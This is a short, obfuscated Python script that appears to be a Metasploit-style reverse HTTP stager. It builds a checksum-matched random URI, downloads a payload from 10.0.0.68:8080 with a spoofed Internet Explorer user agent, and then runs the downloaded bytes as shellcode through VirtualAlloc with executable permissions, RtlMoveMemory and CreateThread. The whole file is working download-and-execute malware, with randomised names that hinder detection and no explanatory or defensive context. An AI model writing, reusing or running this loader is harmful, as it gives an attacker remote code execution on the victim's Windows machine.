import urllib.request, string, random, ctypes as jBBnaMUQpRFK
def KopahNwAaWe(s): return sum([ord(ch) for ch in s]) % 0x100
def nWGYCPIdpBgLFJq():
	for x in range(64):
		CywKldSrPi = ''.join(random.sample(string.ascii_letters + string.digits,3))
		ssfBZYdXWVmbPY = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
		for QUGuJGlQahLWRvk in ssfBZYdXWVmbPY:
			if KopahNwAaWe(CywKldSrPi + QUGuJGlQahLWRvk) == 92: return CywKldSrPi + QUGuJGlQahLWRvk
def mNrKeyBM(qwQupzcg, godWfw):
	bKPOWtXgdJTC = urllib.request.ProxyHandler({})
	modMdrBfVAAMgJW = urllib.request.build_opener(bKPOWtXgdJTC)
	urllib.request.install_opener(modMdrBfVAAMgJW)
	hNeHznER = urllib.request.Request("http://" + qwQupzcg + ":" + str(godWfw) + "/" + nWGYCPIdpBgLFJq(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
	try:
		YicGNro = urllib.request.urlopen(hNeHznER)
		try:
			if int(YicGNro.info()["Content-Length"]) > 100000: return YicGNro.read()
			else: return ''
		except: return YicGNro.read()
	except urllib.request.URLError:
		return ''
def tvjkpd(LYNpRpflRNwfP):
	if LYNpRpflRNwfP != "":
		cILHcwWGbkzXJy = bytearray(LYNpRpflRNwfP)
		KPzOAf = jBBnaMUQpRFK.windll.kernel32.VirtualAlloc(jBBnaMUQpRFK.c_int(0),jBBnaMUQpRFK.c_int(len(cILHcwWGbkzXJy)), jBBnaMUQpRFK.c_int(0x3000),jBBnaMUQpRFK.c_int(0x40))
		WwwoAWlLb = (jBBnaMUQpRFK.c_char * len(cILHcwWGbkzXJy)).from_buffer(cILHcwWGbkzXJy)
		jBBnaMUQpRFK.windll.kernel32.RtlMoveMemory(jBBnaMUQpRFK.c_int(KPzOAf),WwwoAWlLb, jBBnaMUQpRFK.c_int(len(cILHcwWGbkzXJy)))
		PJyxoR = jBBnaMUQpRFK.windll.kernel32.CreateThread(jBBnaMUQpRFK.c_int(0),jBBnaMUQpRFK.c_int(0),jBBnaMUQpRFK.c_int(KPzOAf),jBBnaMUQpRFK.c_int(0),jBBnaMUQpRFK.c_int(0),jBBnaMUQpRFK.pointer(jBBnaMUQpRFK.c_int(0)))
		jBBnaMUQpRFK.windll.kernel32.WaitForSingleObject(jBBnaMUQpRFK.c_int(PJyxoR),jBBnaMUQpRFK.c_int(-1))
YwKZCJ = ''
YwKZCJ = mNrKeyBM("10.0.0.68", 8080)
tvjkpd(YwKZCJ)
